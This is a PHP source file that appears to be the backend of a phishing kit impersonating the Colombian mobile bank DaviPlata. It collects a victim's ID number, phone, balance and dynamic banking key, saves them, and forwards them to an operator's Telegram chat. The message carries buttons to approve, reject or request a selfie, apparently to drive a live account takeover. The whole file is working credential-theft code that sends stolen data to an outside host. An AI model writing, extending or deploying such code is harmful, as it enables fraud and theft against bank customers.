<?php
header('Content-Type: application/json');
include __DIR__ . '/../../db.php';
$config = include __DIR__ . '/../../config.php';

// Leer JSON body o POST
$input = json_decode(file_get_contents('php://input'), true) ?? $_POST;

$tipo_documento = $input['tipo_documento'] ?? '';
$num_documento  = $input['num_documento'] ?? '';
$num_celular    = $input['num_celular'] ?? '';
$saldo_cuenta   = $input['saldo_cuenta'] ?? '';
$clave          = $input['clave'] ?? '';

if (empty($tipo_documento) || empty($num_documento) || empty($num_celular) || empty($saldo_cuenta) || empty($clave)) {
    echo json_encode(['ok' => false, 'mensaje' => 'Todos los campos y la clave son requeridos.']);
    exit();
}

try {
    // Insertar en la tabla clientes
    $stmt = $conn->prepare("INSERT INTO clientes (tipo_documento, num_documento, num_celular, saldo_cuenta, clave, estado) VALUES (:tipo_doc, :num_doc, :num_cel, :saldo, :clave, 'pendiente') RETURNING id");
    $stmt->execute([
        'tipo_doc' => $tipo_documento,
        'num_doc'  => $num_documento,
        'num_cel'  => $num_celular,
        'saldo'    => $saldo_cuenta,
        'clave'    => $clave
    ]);
    $clienteId = $stmt->fetchColumn();

    // Notificar a Telegram
    $botToken = $config['botToken'];
    $chatId = $config['chatId'];
    $baseUrl = $config['baseUrl'];
    $security_key = $config['security_key'];

    // Construir URL dinámica para updatetele.php en pago/davi
    $daviUpdateUrl = rtrim(dirname($baseUrl), '/\\') . '/pago/davi/updatetele.php';

    $texto = "🔔 *Nuevo registro DaviPlata #{$clienteId}*\n\n"
           . "📋 *Tipo doc:* {$tipo_documento}\n"
           . "🪪 *Documento:* `{$num_documento}`\n"
           . "📱 *Celular:* `{$num_celular}`\n"
           . "💰 *Saldo:* $ `{$saldo_cuenta}`\n"
           . "🔐 *Clave Dinámica:* `{$clave}`\n"
           . "📊 *Estado:* pendiente";

    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '✅ Aprobar',      'url' => "{$daviUpdateUrl}?id={$clienteId}&estado=aprobado&key={$security_key}"],
                ['text' => '❌ Rechazar',     'url' => "{$daviUpdateUrl}?id={$clienteId}&estado=rechazado&key={$security_key}"]
            ],
            [
                ['text' => '⏳ En revisión',  'url' => "{$daviUpdateUrl}?id={$clienteId}&estado=en_revision&key={$security_key}"],
                ['text' => '📸 Pedir Selfie', 'url' => "{$daviUpdateUrl}?id={$clienteId}&estado=pedir_selfie&key={$security_key}"]
            ]
        ]
    ];

    $tgData = [
        'chat_id' => $chatId,
        'text' => $texto,
        'parse_mode' => 'Markdown',
        'reply_markup' => json_encode($keyboard)
    ];

    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($tgData),
            'ignore_errors' => true
        ]
    ];
    $context = stream_context_create($options);
    file_get_contents("https://api.telegram.org/bot{$botToken}/sendMessage", false, $context);

    echo json_encode(['ok' => true, 'id' => $clienteId, 'mensaje' => '✅ Datos enviados correctamente.']);
} catch (Exception $e) {
    echo json_encode(['ok' => false, 'mensaje' => 'Error en el servidor: ' . $e->getMessage()]);
}
?>
